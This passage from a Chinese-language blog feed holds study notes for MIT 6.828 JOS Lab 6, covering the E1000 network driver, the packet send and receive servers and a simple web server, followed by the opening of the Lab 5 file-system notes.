class="line"></span><br><span class="line">    <span class="comment">//设置尾指针寄存器</span></span><br><span class="line">    tdt = (struct e1000_tdt *)E1000REG(E1000_TDT);</span><br><span class="line">    tdt-&gt;tdt = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//TCTL register</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">e1000_tctl</span> *<span class="title">tctl</span> =</span> (struct e1000_tctl *)E1000REG(E1000_TCTL);</span><br><span class="line">    tctl-&gt;en = <span class="number">1</span>;</span><br><span class="line">    tctl-&gt;psp = <span class="number">1</span>;</span><br><span class="line">    tctl-&gt;ct = <span class="number">0x10</span>;</span><br><span class="line">    tctl-&gt;cold = <span class="number">0x40</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//TIPG register</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">e1000_tipg</span> *<span class="title">tipg</span> =</span> (struct e1000_tipg *)E1000REG(E1000_TIPG);</span><br><span class="line">    tipg-&gt;ipgt = <span class="number">10</span>;</span><br><span class="line">    tipg-&gt;ipgr1 = <span class="number">4</span>;</span><br><span class="line">    tipg-&gt;ipgr2 = <span class="number">6</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>现在初始化已经完成，接着需要编写代码发送数据包，提供系统调用给用户代码使用。要发送一个数据包，需要将数据拷贝到数据下一个数据缓冲区，然后更新TDT寄存器来通知网卡新的数据包已经就绪。</p><p><strong>exercise6</strong></p><p>编写发送数据包的函数，处理好发送队列已满的情况。如果发送队列满了怎么办？</p><p>怎么检测发送队列已满；如果设置了发送描述符的RS位，那么当网卡发送了一个描述符指向的数据包后，会设置该描述符的DD位，通过这个标志位就能知道某个描述符是否能被回收。检测到当发送队列已满后怎么办：可以简单的丢弃准备发送的数据包。也可以告诉用户进程进程当前发送队列已满，请重试，就像sys_ipc_try_send()一样。我们采用重试的方式。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> </span><br><span class="line">e1000_transmit(<span class="keyword">void</span> *data,<span class="keyword">size_t</span> len)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> current = tdt-&gt;tdt; <span class="comment">//tail index in queue</span></span><br><span class="line">    <span class="keyword">if</span>(!(tx_desc_array[current].status &amp; E1000_TXD_STAT_DD))&#123;</span><br><span class="line">        <span class="keyword">return</span> -E_TRANSMIT_RETRY;</span><br><span class="line">    &#125;</span><br><span class="line">    tx_desc_array[current].length = len;</span><br><span class="line">    tx_desc_array[current].status &amp;= ~E1000_TXD_STAT_DD;</span><br><span class="line">    tx_desc_array[current].cmd |= (E1000_TXD_CMD_EOP | E1000_TXD_CMD_RS); </span><br><span class="line">    <span class="built_in">memcpy</span>(tx_buffer_array[current],data,len);</span><br><span class="line">    <span class="keyword">uint32_t</span> next = (current + <span class="number">1</span>) % TXDESCS;</span><br><span class="line">    tdt-&gt;tdt = next;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://blog-1253119293.cos.ap-beijing.myqcloud.com/6.828/lab6/lab6_5_driver_queue.png" alt="驱动工作方式"></p><p>对于发送队列来说是一个典型的生产者-消费者模型：</p><ol><li>生产者：用户进程。通过系统调用往tail指向的描述符的缓冲区添加数据包，并且移动tail。</li><li>消费者：网卡。通过DMA的方式直接从head指向的描述符对应的缓冲区拿包发送出去，并移动head</li></ol><p>接受队列也类似</p><p><strong>exercise7</strong></p><p>实现发送数据包的系统调用，我们已经添加过很多次了，这里就不贴代码了</p><h2 id="Transmitting-Packets-Network-Server"><a href="#Transmitting-Packets-Network-Server" class="headerlink" title="Transmitting Packets: Network Server"></a>Transmitting Packets: Network Server</h2><p>输出协助进程的任务是，执行一个无限循环，在该循环中接受核心网络进程的IPC请求，解析该请求，然后使用系统调用发送数据。</p><p><strong>exercise8</strong></p><p>实现net/output.c</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;ns.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inc/lib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="class"><span class="keyword">union</span> <span class="title">Nsipc</span> <span class="title">nsipcbuf</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span></span><br><span class="line">output(<span class="keyword">envid_t</span> ns_envid)</span><br><span class="line">&#123;</span><br><span class="line">binaryname = <span class="string">&quot;ns_output&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// LAB 6: Your code here:</span></span><br><span class="line"><span class="comment">// - read a packet from the network server</span></span><br><span class="line"><span class="comment">//- send the packet to the device driver</span></span><br><span class="line"><span class="keyword">uint32_t</span> whom;</span><br><span class="line"><span class="keyword">int</span> perm;</span><br><span class="line"><span class="keyword">int32_t</span> req;</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">req = ipc_recv((<span class="keyword">envid_t</span>*)&amp;whom,&amp;nsipcbuf,&amp;perm);<span class="comment">//接受核心网络进程发来的请求</span></span><br><span class="line"><span class="keyword">if</span>(req != NSREQ_OUTPUT)&#123;</span><br><span class="line">cprintf(<span class="string">&quot;not a nsreq output!\n&quot;</span>);</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">jif_pkt</span> *<span class="title">pkt</span> =</span> &amp;(nsipcbuf.pkt);</span><br><span class="line"><span class="keyword">while</span>(sys_pkt_send(pkt-&gt;jp_data,pkt-&gt;jp_len) &lt; <span class="number">0</span>)&#123;<span class="comment">//通过系统调用发送数据包</span></span><br><span class="line">sys_yield();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Part-B-Receiving-packets-and-the-web-server"><a href="#Part-B-Receiving-packets-and-the-web-server" class="headerlink" title="Part B: Receiving packets and the web server"></a>Part B: Receiving packets and the web server</h1><h2 id="Receiving-Packets"><a href="#Receiving-Packets" class="headerlink" title="Receiving Packets"></a>Receiving Packets</h2><p>像发送过程一样，需要配置E1000去接受数据包，同时提供一个接受描述符队列，接受缓冲区。3.2节描述了数据包接受的工作原理，包括接受队列和接受描述符，初始化过程详见14.4节。</p><p><strong>exercise9</strong></p><p>阅读文档我们可以写出接受描述符的结构体</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">e1000_rx_desc</span> &#123;</span></span><br><span class="line">       <span class="keyword">uint64_t</span> addr;</span><br><span class="line">       <span class="keyword">uint16_t</span> length;</span><br><span class="line">       <span class="keyword">uint16_t</span> chksum;</span><br><span class="line">       <span class="keyword">uint8_t</span> status;</span><br><span class="line">       <span class="keyword">uint8_t</span> errors;</span><br><span class="line">       <span class="keyword">uint16_t</span> special;</span><br><span class="line">&#125;__attribute__((packed));</span><br></pre></td></tr></table></figure><p>当E1000收到数据包时，它首先检查它是否与卡配置的过滤器匹配（例如，查看数据包中MAC地址与网卡是否匹配），如果数据包与任意一个过滤器不匹配，则忽略该数据包。 否则，E1000尝试从接收队列的头部检索下一个接收描述符。 如果头部（RDH）已经赶上尾部（RDT），则接收队列没有空闲描述符，网卡将会丢弃数据包。 如果存在空闲接收描述符，则将分组数据复制到描述符指向的缓冲区中，设置描述符的DD（描述符完成）和EOP（包结束）状态位，并递增 RDH。</p><p>如果 E1000 接收到一个数据包，其大小大于数据包缓冲区大小，它将从接收队列中检索所需数量的描述符以完整存储数据包。 为了表明发生这种情况，它将在所有这些描述符上设置DD状态位，但仅在最后一个描述符上设置<code>EOP</code>状态位。 我们可以选择在驱动程序中处理这种可能性，或者只是将网卡配置为不接受“长数据包”（也称为巨型帧）并确保接收缓冲区足够大以存储最大可能的标准以太网数据包（1518字节）。</p><p><strong>exercise10</strong></p><p>这部分与发送部分代码编写流程是类似的，查文档，为接收描述符、接收buffer 分配静态内存等，然后对接收描述符、E1000 RCTL等寄存器进行初始化。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">get_ra_address(<span class="keyword">uint32_t</span> mac[],<span class="keyword">uint32_t</span> *ral,<span class="keyword">uint32_t</span> *rah)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> low = <span class="number">0</span>,high = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)&#123;</span><br><span class="line">        low |= mac[i] &lt;&lt; (<span class="number">8</span> * i);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">4</span>; i &lt; <span class="number">6</span>; i++)&#123;</span><br><span class="line">        high |= mac[i] &lt;&lt; (<span class="number">8</span> * i);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    *ral = low;</span><br><span class="line">    *rah = high | E1000_RAH_AV;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> </span><br><span class="line">e1000_receive_init()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//RDBAL and RDBAH register</span></span><br><span class="line">    <span class="keyword">uint32_t</span> *rdbal = (<span class="keyword">uint32_t</span> *)E1000REG(E1000_RDBAL);</span><br><span class="line">    <span class="keyword">uint32_t</span> *rdbah = (<span class="keyword">uint32_t</span> *)E1000REG(E1000_RDBAH);</span><br><span class="line">    </span><br><span class="line">    *rdbah = <span class="number">0</span>;</span><br><span class="line">    *rdbal = PADDR(rx_desc_array);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>;i &lt; RXDESCS; i++)&#123;</span><br><span class="line">        rx_desc_array[i].addr = PADDR(rx_buffer_array[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//RDLEN register</span></span><br><span class="line">    rdlen = (struct e1000_rdlen *)E1000REG(E1000_RDLEN);</span><br><span class="line">    rdlen-&gt;len = RXDESCS;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//RDH and RDT register</span></span><br><span class="line">    rdh = (struct e1000_rdh *)E1000REG(E1000_RDH);</span><br><span class="line">    rdt = (struct e1000_rdt *)E1000REG(E1000_RDT);</span><br><span class="line"></span><br><span class="line">    rdh-&gt;rdh = <span class="number">0</span>;</span><br><span class="line">    rdt-&gt;rdt = RXDESCS - <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint32_t</span> *rctl = (<span class="keyword">uint32_t</span> *)E1000REG(E1000_RCTL);</span><br><span class="line">    *rctl = E1000_RCTL_BAM | E1000_RCTL_EN | E1000_RCTL_SECRC;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint32_t</span> *ra = (<span class="keyword">uint32_t</span> *)E1000REG(E1000_RA);</span><br><span class="line">    <span class="keyword">uint32_t</span> ral,rah;</span><br><span class="line">    get_ra_address(E1000_MAC,&amp;ral,&amp;rah);</span><br><span class="line">    ra[<span class="number">0</span>] = rah;</span><br><span class="line">    ra[<span class="number">1</span>] = ral;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>现在我们已经准备好开始接受数据包。要接收数据包，我们的驱动程序必须跟踪希望被保留下来接受数据包的下一个描述符。与发送类似，文档指出无法从软件中可靠地读取RDH寄存器，因此为了确定数据包是否已传动到此描述符的数据包缓冲区，我们必须读取描述符中的DD状态位。如果DD位已经置位（此由硬件完成），则可以将数据包数据从该描述符的数据包缓冲区中复制出来，然后通过更新队列的尾部索引RDT告诉卡该描述符是空闲的。</p><p>如果DD位未置位，则表示此时此刻未收到任何数据包。 在这种情况下我们可以只需返回“try again”错误，并要求调用者重试。</p><p><strong>exercise11</strong></p><p>receive的实现，最重要的一点就是理解硬件接受数据包的过程：当硬件接收到数据包时，首先会进行一次过滤(比对MAC地址等)，若符合接受标准，硬件会将数据包存储到我们分配的buffer中，并同时设置描述符的DD位以及执行RDH加1操作。所以当我们编写receive函数时，可以选择定义一个static变量，用来指向第一个可接收的描述符。系统调用的实现就不再详细给出。receive的实现如下：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">e1000_receive(<span class="keyword">void</span> *addr,<span class="keyword">size_t</span> *len)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">int32_t</span> next = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(!(rx_desc_array[next].status &amp;&amp; E1000_RXD_STAT_DD))&#123; <span class="comment">//simply tell client to retry</span></span><br><span class="line">        <span class="keyword">return</span> -E_RECEIVE_RETRY;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(rx_desc_array[next].errors)&#123;</span><br><span class="line">        cprintf(<span class="string">&quot;receive error\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> -E_RECEIVE_RETRY;</span><br><span class="line">    &#125;</span><br><span class="line">    *len = rx_desc_array[next].length;</span><br><span class="line">    <span class="built_in">memcpy</span>(addr,rx_buffer_array[next],*len);</span><br><span class="line">    </span><br><span class="line">    next = (next + <span class="number">1</span>) % RXDESCS;</span><br><span class="line">    rdt-&gt;rdt = (rdt-&gt;rdt + <span class="number">1</span>) % RXDESCS;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Receiving-Packets-Network-Server"><a href="#Receiving-Packets-Network-Server" class="headerlink" title="Receiving Packets: Network Server"></a>Receiving Packets: Network Server</h2><p>在网络服务器输入环境中，您将需要使用新的接受系统调用来接受数据包，并使用<code>NSREQ_INPUT</code>IPC信息将它们传送到核心网络服务器环境。这些IPC输入消息应该有一个页面附加一个<code>union Nsipc</code>，其<code>struct jif_pkt pkt</code>字段填入从网络接受的数据包。</p><p><strong>exercise12</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;ns.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;kern/e1000.h&gt;</span></span></span><br><span class="line"><span class="keyword">extern</span> <span class="class"><span class="keyword">union</span> <span class="title">Nsipc</span> <span class="title">nsipcbuf</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span></span><br><span class="line">sleep(<span class="keyword">int</span> msec)</span><br><span class="line">&#123;</span><br><span class="line">       <span class="keyword">unsigned</span> now = sys_time_msec();</span><br><span class="line">       <span class="keyword">unsigned</span> end = now + msec;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> ((<span class="keyword">int</span>)now &lt; <span class="number">0</span> &amp;&amp; (<span class="keyword">int</span>)now &gt; -MAXERROR)</span><br><span class="line">               panic(<span class="string">&quot;sys_time_msec: %e&quot;</span>, (<span class="keyword">int</span>)now);</span><br><span class="line"></span><br><span class="line">       <span class="keyword">while</span> (sys_time_msec() &lt; end)</span><br><span class="line">               sys_yield();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span></span><br><span class="line">input(<span class="keyword">envid_t</span> ns_envid)</span><br><span class="line">&#123;</span><br><span class="line">binaryname = <span class="string">&quot;ns_input&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// LAB 6: Your code here:</span></span><br><span class="line"><span class="comment">// - read a packet from the device driver</span></span><br><span class="line"><span class="comment">//- send it to the network server</span></span><br><span class="line"><span class="comment">// Hint: When you IPC a page to the network server, it will be</span></span><br><span class="line"><span class="comment">// reading from it for a while, so don&#x27;t immediately receive</span></span><br><span class="line"><span class="comment">// another packet in to the same physical page.</span></span><br><span class="line"><span class="keyword">size_t</span> len;</span><br><span class="line"><span class="keyword">char</span> buf[RX_PKT_SIZE];</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(sys_pkt_recv(buf,&amp;len) &lt; <span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">memcpy</span>(nsipcbuf.pkt.jp_data,buf,len);</span><br><span class="line">nsipcbuf.pkt.jp_len = len;</span><br><span class="line">ipc_send(ns_envid,NSREQ_INPUT,&amp;nsipcbuf,PTE_P | PTE_U | PTE_W);</span><br><span class="line">sleep(<span class="number">50</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>为了更彻底地测试我们的网络代码，源码已经提供了一个名为<code>echosrv</code>的守护进程，它设置一个在 port 7上运行的<code>echo</code>服务器，它将回显通过TCP连接发送的任何内容。我们在一个终端执行<code>make E1000_DEBUG=TX,TXERR,RX,RXERR,RXFILTER run-echosrv</code> 开启 echo 服务器， 在另一个终端执行 <code>make nc-7</code>连接 echo 服务器。可以看到 nc 端的消息回显。</p><blockquote><p>Question</p><ol><li><p>你是如何构建接收实现的？ 特别是，如果接收队列为空并且用户环境请求下一个传入数据包，你会怎么做？</p><p>用户请求接收时，若接受不成功（队列为空），则<code>sched</code>暂时让出控制权。接收成功，发送IPC，通知网络核心环境已经获得数据包，并简单sleep 50 ms，因为 网络核心环境需要时间对当前 shared 页的数据包进行处理。 当然，这样效率十分低下，我们可以考虑在Input环境中申请一定数量的页，轮流使用这个页向网络核心环境传递网络数据包。</p></li></ol></blockquote><h2 id="The-Web-Server"><a href="#The-Web-Server" class="headerlink" title="The Web Server"></a>The Web Server</h2><p>在usr/httpd.c中的框架代码处理到达的连接并解析消息头部</p><p>首先编写<code>send_file</code>，根据提示，在原有的代码前添加以下代码。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">int</span></span><br><span class="line">send_file(struct http_request *req)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> r;</span><br><span class="line"><span class="keyword">off_t</span> file_size = <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">int</span> fd;</span><br><span class="line"></span><br><span class="line"><span class="comment">// open the requested url for reading</span></span><br><span class="line"><span class="comment">// if the file does not exist, send a 404 error using send_error</span></span><br><span class="line"><span class="comment">// if the file is a directory, send a 404 error using send_error</span></span><br><span class="line"><span class="comment">// set file_size to the size of the file</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// LAB 6: Your code here.</span></span><br><span class="line"><span class="comment">//panic(&quot;send_file not implemented&quot;);</span></span><br><span class="line"><span class="keyword">if</span>((fd = open(req-&gt;url,O_RDONLY)) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">send_error(req,<span class="number">404</span>);</span><br><span class="line"><span class="keyword">goto</span> end;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Stat</span> <span class="title">stat</span>;</span></span><br><span class="line">fstat(fd, &amp;stat);</span><br><span class="line"><span class="keyword">if</span> (stat.st_isdir) &#123; <span class="comment">//是一个目录</span></span><br><span class="line">send_error(req, <span class="number">404</span>);</span><br><span class="line"><span class="keyword">goto</span> end;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((r = send_header(req, <span class="number">200</span>)) &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">goto</span> end;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((r = send_size(req, file_size)) &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">goto</span> end;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((r = send_content_type(req)) &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">goto</span> end;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((r = send_header_fin(req)) &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">goto</span> end;</span><br><span class="line"></span><br><span class="line">r = send_data(req, fd);</span><br><span class="line"></span><br><span class="line">end:</span><br><span class="line">close(fd);</span><br><span class="line"><span class="keyword">return</span> r;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后是<code>send_data</code></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">int</span></span><br><span class="line">send_data(struct http_request *req, <span class="keyword">int</span> fd)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// LAB 6: Your code here.</span></span><br><span class="line"><span class="comment">//panic(&quot;send_data not implemented&quot;);</span></span><br><span class="line"><span class="comment">//从fd中读取size大小数据,并发送</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Stat</span> <span class="title">stat</span>;</span></span><br><span class="line">fstat(fd,&amp;stat);</span><br><span class="line"><span class="keyword">void</span> *buf = <span class="built_in">malloc</span>(stat.st_size);</span><br><span class="line"><span class="keyword">if</span>(readn(fd,buf,stat.st_size) != stat.st_size)&#123;</span><br><span class="line">panic(<span class="string">&quot;failed to read requested file\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//write to socket</span></span><br><span class="line"><span class="keyword">if</span>(write(req-&gt;sock,buf,stat.st_size) != stat.st_size)&#123;</span><br><span class="line">panic(<span class="string">&quot;failed to send bytes to client&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">free</span>(buf);</span><br><span class="line">buf = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后 run <code>make run-httpd-nox</code>，然后在虚拟机的浏览器中输入<code>http://localhost:26002</code>，浏览器会显示404， 然后输入<code>http://localhost:26002/index.html</code>，Web将会返回内容<code>cheesy web page</code>。</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><ol><li><p>实现网卡驱动。</p><ol><li>通过MMIO方式访问网卡，直接通过内存就能设置网卡的工作方式和特性。</li><li>通过DMA方式，使得网卡在不需要CPU干预的情况下直接和内存交互。具体工作方式如下：<img src="https://blog-1253119293.cos.ap-beijing.myqcloud.com/6.828/lab6/lab6_5_driver_queue.png" alt="驱动工作方式"> 以发送数据为例，维护一个发送队列，生产者将要发送的数据放到发送队列中tail指向的描述符对应的缓冲区，同时更新tail指针。网卡作为消费者，从head指向的描述符对应的缓冲区拿到数据并发送出去，然后更新head指针。</li></ol></li><li><p>用户级线程实现。主要关注三个函数就能明白原理：</p><ol><li>thread_init()</li><li>thread_create()</li><li>thread_yield()</li></ol></li></ol><p><img src="https://inews.gtimg.com/newsapp_ls/0/13965893358/0" alt="image-20210910181407379"></p>]]></content:encoded>
      
      <comments>https://billyotry.github.io/2021/09/01/%E3%80%90MIT6.828%E3%80%91JOS%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%20Lab6/#disqus_thread</comments>
    </item>
    
    <item>
      <title>【MIT 6.828】JOS学习笔记 Lab5</title>
      <link>https://billyotry.github.io/2021/08/24/%E3%80%90MIT6.828%E3%80%91JOS%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%20Lab5/</link>
      <guid>https://billyotry.github.io/2021/08/24/%E3%80%90MIT6.828%E3%80%91JOS%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%20Lab5/</guid>
      <pubDate>Tue, 24 Aug 2021 11:49:31 GMT</pubDate>
      <description>
      
        
        
          &lt;h1 id=&quot;File-system-preliminaries&quot;&gt;&lt;a href=&quot;#File-system-preliminaries&quot; class=&quot;headerlink&quot; title=&quot;File system preliminaries&quot;&gt;&lt;/a&gt;File system
        
      
      </description>
      
      
      <content:encoded><![CDATA[<h1 id="File-system-preliminaries"><a href="#File-system-preliminaries" class="headerlink" title="File system preliminaries"></a>File system preliminaries</h1><p>我们要完成一个相对简单的文件系统，其可以实现创建、读、写以及删除在分层目录结构中组织的文件。目前，我们的OS只支持单用户，因此我们的文件系统也不支持UNIX文件拥有或权限的概念。同时不支持硬链接、符号链接、时间戳或者特别的设备文件。</p><h2 id="On-Disk-File-System-Structure"><a href="#On-Disk-File-System-Structure" class="headerlink" title="On-Disk File System Structure"></a>On-Disk File System Structure</h2><p>JOS的文件系统不适用inodes，所有文件的元数据都被存储在directory entry中。</p><p>文件和目录逻辑上都是由一系列数据block组成，这些blocks分散在磁盘中，文件系统屏蔽block分布的细节，提供一个可以顺序读写文件的接口。JOS文件系统允许用户读目录元数据，这就意味着用户可以扫描目录来像实现ls这种程序，UNIX没有采用这种方式的原因是，这种方式使得应用程序过度依赖目录元数据格式。</p><h3 id="Sectors-and-Blocks"><a href="#Sectors-and-Blocks" class="headerlink" title="Sectors and Blocks"></a>Sectors and Blocks</h3><p>大部分磁盘都是以为Sectors为粒度进行读写，JOS中Secotrs为512字节。文件系统以block为单位分配和使用磁盘。注意区别，secotr size是磁盘的属性，block size是操作系统使用磁盘的粒度。JOS文件系统的block size被定为4096字节。</p><h3 id="Superblocks"><a href="#Superblocks" class="headerlink" title="Superblocks"></a>Superblocks</h3><p>文件系统使用一些特殊的block保存文件系统属性元数据，比如block size，disk size，根目录位置等。这些特殊的block称为superblock。</p><p>我们的文件系统使用一个superblock，位于磁盘的block 1。block 0被用来保存boot loader和分区表。很多文件系统维护多个superblock，这样当一个损坏的时候，依然可以正常允许。</p><p>磁盘结构如下：</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13923446162/0" alt="image-20210826233321315"></p><p>Super的结构如下：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Super</span> &#123;</span></span><br><span class="line">    <span class="keyword">uint32_t</span> s_magic;       <span class="comment">// Magic number: FS_MAGIC</span></span><br><span class="line">    <span class="keyword">uint32_t</span> s_nblocks;     <span class="comment">// Total number of blocks on disk</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">File</span> <span class="title">s_root</span>;</span>     <span class="comment">// Root directory node</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="File-Meta-data"><a href="#File-Meta-data" class="headerlink" title="File Meta-data"></a>File Meta-data</h3><p>我们的文件系统使用struct File结构描述文件，该结构包含文件名、大小、类型，保存文件内容的block号。struct File结构的f_direct数组保存前NDIRECT(10)个block号，这样对于10*4096 = 40KB的文件不需要额外的空间来记录内容block号。对于更大的文件我们需要分配一个额外的block来保存，可容纳多达4096/4 = 1024个额外的block。所以我们的文件系统允许文件拥有1034个block。</p><p>File结构如下：</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13923462031/0" alt="image-20210826234231996"></p><p>File结构定义在inc/fs.h中：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">File</span> &#123;</span></span><br><span class="line"><span class="keyword">char</span> f_name[MAXNAMELEN];<span class="comment">// filename</span></span><br><span class="line"><span class="keyword">off_t</span> f_size;<span class="comment">// file size in bytes</span></span><br><span class="line"><span class="keyword">uint32_t</span> f_type;<span class="comment">// file type</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Block pointers.</span></span><br><span class="line"><span class="comment">// A block is allocated iff its value is != 0.</span></span><br><span class="line"><span class="keyword">uint32_t</span> f_direct[NDIRECT];<span class="comment">// direct blocks</span></span><br><span class="line"><span class="keyword">uint32_t</span> f_indirect;<span class="comment">// indirect block</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Pad out to 256 bytes; must do arithmetic in case we&#x27;re compiling</span></span><br><span class="line"><span class="comment">// fsformat on a 64-bit machine.</span></span><br><span class="line"><span class="keyword">uint8_t</span> f_pad[<span class="number">256</span> - MAXNAMELEN - <span class="number">8</span> - <span class="number">4</span>*NDIRECT - <span class="number">4</span>];</span><br><span class="line">&#125; __attribute__((packed));<span class="comment">// required only on some 64-bit machines</span></span><br></pre></td></tr></table></figure><h3 id="Directories-versus-Regular-Files"><a href="#Directories-versus-Regular-Files" class="headerlink" title="Directories versus Regular Files"></a>Directories versus Regular Files</h3><p>File结构既能代表文件也能代表目录，由type字段取分，文件系统以相同的方式管理文件和目录，只是目录文件的内容是一系列File结构，这些File结构描述了在该目录下的文件或者子目录。</p><p>超级块包含一个File结构，代码文件系统的根目录。</p><h1 id="The-File-System"><a href="#The-File-System" class="headerlink" title="The File System"></a>The File System</h1><p>我们实现的文件系统的关键部分，读数据到缓存中并能写回磁盘；分配磁盘块；将文件偏移映射到磁盘块；并在IPC接口中实现读，写和打开。</p><h2 id="Disk-Access"><a href="#Disk-Access" class="headerlink" title="Disk Access"></a>Disk Access</h2><p>到目前为之内核还没有访问磁盘的能力。JOS不像其他操作系统一样在内核添加磁盘驱动，然后提供系统调用。我们实现一个文件系统进程来作为磁盘驱动。</p><p>x86处理器使用EFLAGS寄存器的IOPL位来控制保护模式下的代码能否执行设备IO指令，比如in和out。我们希望文件系统进程能访问IO空间，其他进程不能。</p><p><strong>exercise1</strong></p><p>创建一个文件系统进程，其实它和普通的进程差不多，就是能够读写IO设备。所以我们给它加上权限。</p><p>env_create修改为如下代码：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">env_create(<span class="keyword">uint8_t</span> *binary, <span class="keyword">enum</span> EnvType type)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// LAB 3: Your code here.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// If this is the 